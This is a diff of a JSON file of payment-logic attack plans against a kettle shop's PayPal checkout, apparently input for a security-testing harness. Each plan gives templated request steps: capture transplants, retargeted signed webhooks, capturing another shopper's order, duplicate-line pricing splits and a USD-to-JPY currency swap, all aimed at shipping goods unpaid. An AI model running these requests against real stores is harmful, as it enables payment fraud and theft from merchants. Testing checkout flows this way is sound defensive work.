@@ -1,50 +1,13 @@
 {
   "plans": [
     {
-      "name": "Old PayPal order, new shop order",
-      "idea": "The capture endpoint may validate only that the PayPal order in the URL is completed for $64, without checking that its purchase-unit reference was not already consumed by KC-F29139 or that it belongs to the newest shop order in the session.",
-      "expect": "A second kettle shipped under the fresh shop order although the only completed PayPal capture already paid for the original order.",
-      "steps": [
-        {
-          "do": "request",
-          "method": "POST",
-          "path": "/api/checkout/paypal",
-          "body": {
-            "lines": [
-              {
-                "product": "KC-KETTLE",
-                "count": 1
-              }
-            ],
-            "paypalOrderId": "{{legit.paypalOrderId}}",
-            "custom_id": "{{legit.shopOrderId}}"
-          },
-          "save": "a"
-        },
-        {
-          "do": "request",
-          "method": "POST",
-          "path": "/api/checkout/paypal/{{legit.paypalOrderId}}/capture",
-          "body": {},
-          "save": "c"
-        }
-      ]
-    },
-    {
-      "name": "Swap basket after approval",
-      "idea": "Capture may resolve the shipment from the latest shop order or cart in the session instead of the shop order permanently bound to the approved PayPal order.",
-      "expect": "Pay $64 for the approved one-kettle PayPal order, but ship the later ten-kettle shop order.",
+      "name": "Mutate the approved order before capture",
+      "idea": "The capture handler may use the session's latest shop order, or a second create call may upsert the same ref/PayPal order, without rechecking that the captured amount still matches the fulfilled lines.",
+      "expect": "Ten kettles shipped although only the original $64 PayPal order was approved and captured.",
       "steps": [
         {
           "do": "buy",
-          "tamper": {
-            "lines": [
-              {
-                "product": "KC-KETTLE",
-                "count": 1
-              }
-            ]
-          },
+          "tamper": {},
           "blockCapture": true,
           "save": "b"
         },
@@ -53,6 +16,10 @@
           "method": "POST",
           "path": "/api/checkout/paypal",
           "body": {
+            "ref": "{{b.shopOrderId}}",
+            "shopOrderId": "{{b.shopOrderId}}",
+            "paypalOrderId": "{{b.paypalOrderId}}",
+            "custom_id": "{{b.shopOrderId}}",
             "lines": [
               {
                 "product": "KC-KETTLE",
@@ -60,6 +27,8 @@
               }
             ]
           },
+          "times": 1,
+          "together": false,
           "save": "a"
         },
         {
@@ -67,14 +36,16 @@
           "method": "POST",
           "path": "/api/checkout/paypal/{{b.paypalOrderId}}/capture",
           "body": {},
+          "times": 1,
+          "together": false,
           "save": "c"
         }
       ]
     },
     {
-      "name": "Duplicate lines split pricing and fulfilment",
-      "idea": "The browser cart is a Map, so it never sends duplicate SKUs. The server may collapse duplicate lines by product when pricing, while fulfilment may sum the raw lines, or vice versa.",
-      "expect": "Be charged for one kettle but receive ten kettles.",
+      "name": "Duplicate-line price/fulfilment split",
+      "idea": "Pricing may collapse duplicate SKUs through a map or object while fulfilment iterates the raw lines, or the reverse validation may assume the storefront cart can never contain duplicates.",
+      "expect": "Two kettles shipped for the price of one.",
       "steps": [
         {
           "do": "buy",
@@ -86,7 +57,7 @@
               },
               {
                 "product": "KC-KETTLE",
-                "count": 9
+                "count": 1
               }
             ]
           },
@@ -96,9 +67,9 @@
       ]
     },
     {
-      "name": "Capture proof supplied in capture body",
-      "idea": "The capture handler may trust a client-supplied capture ID or status, or may verify the legitimate capture globally without binding its related order, custom_id, and payee to this shop order.",
-      "expect": "The fresh unpaid shop order is marked shipped by reusing the legitimate capture as proof for a different PayPal order.",
+      "name": "Transplant a completed capture at capture time",
+      "idea": "The capture endpoint may trust capture identifiers or completion fields supplied in its request body, or verify the supplied old PayPal order while marking the order named in the path as paid, without checking custom_id linkage.",
+      "expect": "A newly created, never-approved kettle order is marked shipped using the earlier completed $64 capture.",
       "steps": [
         {
           "do": "request",
@@ -112,6 +83,8 @@
               }
             ]
           },
+          "times": 1,
+          "together": false,
           "save": "a"
         },
         {
@@ -119,24 +92,32 @@
           "method": "POST",
           "path": "/api/checkout/paypal/{{a.body.paypalOrderId}}/capture",
           "body": {
+            "paypalOrderId": "{{legit.paypalOrderId}}",
             "captureId": "{{legit.captureId}}",
-            "capture_id": "{{legit.captureId}}",
             "status": "COMPLETED",
-            "state": "shipped",
+            "capture": {
+              "id": "{{legit.captureId}}",
+              "status": "COMPLETED",
+              "amount": {
+                "currency_code": "USD",
+                "value": "64.00"
+              }
+            },
             "amount": {
               "currency_code": "USD",
-              "value": "{{legit.bagTotal}}"
-            },
-            "final_capture": true
+              "value": "64.00"
+            }
           },
+          "times": 1,
+          "together": false,
           "save": "c"
         }
       ]
     },
     {
-      "name": "Duplicate reference plus genuine webhook",
-      "idea": "Order creation may mass-assign reference or PayPal-order fields, creating a distinct unpaid record sharing the legitimate order identity. An unedited, correctly signed capture webhook may then be deduplicated against the original record but transition this duplicate record.",
-      "expect": "An extra shipment under a duplicate order record without a new payment, using the genuine signed webhook rather than a forged or merely replayed one.",
+      "name": "Retarget a real capture webhook",
+      "idea": "The webhook handler may look up the shop order solely from edited custom_id/invoice fields and may not confirm that the capture belongs to that order or that this capture was not already consumed by another order.",
+      "expect": "An unpaid kettle order is shipped after receiving the genuine capture event retargeted to it.",
       "steps": [
         {
           "do": "request",
@@ -148,53 +129,66 @@
                 "product": "KC-KETTLE",
                 "count": 1
               }
-            ],
-            "ref": "{{legit.shopOrderId}}",
-            "custom_id": "{{legit.shopOrderId}}",
-            "shopOrderId": "{{legit.shopOrderId}}",
-            "paypalOrderId": "{{legit.paypalOrderId}}"
+            ]
           },
+          "times": 1,
+          "together": false,
           "save": "a"
         },
         {
           "do": "webhook",
           "event": "PAYMENT.CAPTURE.COMPLETED",
-          "edit": {},
+          "edit": {
+            "resource.custom_id": "{{a.body.ref}}",
+            "resource.invoice_id": "{{a.body.ref}}",
+            "resource.supplementary_data.related_ids.order_id": "{{a.body.paypalOrderId}}"
+          },
           "signed": true,
           "times": 1
         }
       ]
     },
     {
-      "name": "Partial amount at capture stage",
-      "idea": "The order may be created and approved for the correct $64, while the separate capture endpoint may forward a client-supplied amount to PayPal or ship on any successful capture without comparing the captured amount with the order total.",
-      "expect": "The kettle ships after capturing only $0.01 of the approved $64 order.",
+      "name": "Capture another shopper's approved order",
+      "idea": "PayPal order 77Y56638MF767953X for shop order KC-C05F7E was approved but had no capture in the events; the capture route may not bind a PayPal order to the session that created or approved it.",
+      "expect": "KC-C05F7E is captured and shipped even though this shopper session never created, approved, or paid for it.",
+      "steps": [
+        {
+          "do": "request",
+          "method": "POST",
+          "path": "/api/checkout/paypal/77Y56638MF767953X/capture",
+          "body": {},
+          "times": 1,
+          "together": false,
+          "save": "a"
+        }
+      ]
+    },
+    {
+      "name": "Currency denomination swap",
+      "idea": "Extra currency or purchase-unit fields may be passed through to PayPal, or capture validation may compare only the numeric value and ignore the currency code.",
+      "expect": "A kettle is shipped after approval of 64 JPY instead of 64 USD.",
       "steps": [
         {
           "do": "buy",
           "tamper": {
-            "lines": [
+            "currency": "JPY",
+            "currency_code": "JPY",
+            "amount": {
+              "currency_code": "JPY",
+              "value": "64.00"
+            },
+            "purchase_units": [
               {
-                "product": "KC-KETTLE",
-                "count": 1
+                "amount": {
+                  "currency_code": "JPY",
+                  "value": "64.00"
+                }
               }
             ]
           },
-          "blockCapture": true,
+          "blockCapture": false,
           "save": "b"
-        },
-        {
-          "do": "request",
-          "method": "POST",
-          "path": "/api/checkout/paypal/{{b.paypalOrderId}}/capture",
-          "body": {
-            "amount": {
-              "currency_code": "USD",
-              "value": "0.01"
-            },
-            "final_capture": true
-          },
-          "save": "a"
         }
       ]
     }
